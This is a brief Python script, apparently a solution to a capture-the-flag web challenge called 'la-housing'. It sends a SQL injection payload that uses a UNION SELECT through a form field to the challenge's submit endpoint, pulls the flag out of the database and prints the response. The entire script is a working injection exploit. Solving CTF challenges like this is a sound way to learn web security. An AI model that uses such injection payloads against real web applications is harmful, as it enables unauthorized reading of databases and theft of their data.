import requests as req

# url = "http://0.0.0.0:5000/submit"
url = "https://la-housing.chall.lac.tf/submit"
key = "guests"
value = "' UNION select 0,flag,2,3,4,5 from flag where ''='"
assert len(key) <= 10
assert len(value) <= 50

data = {
    key: value,
    "name":"hacker"
}
response =req.post(url, data)
print(response.text)
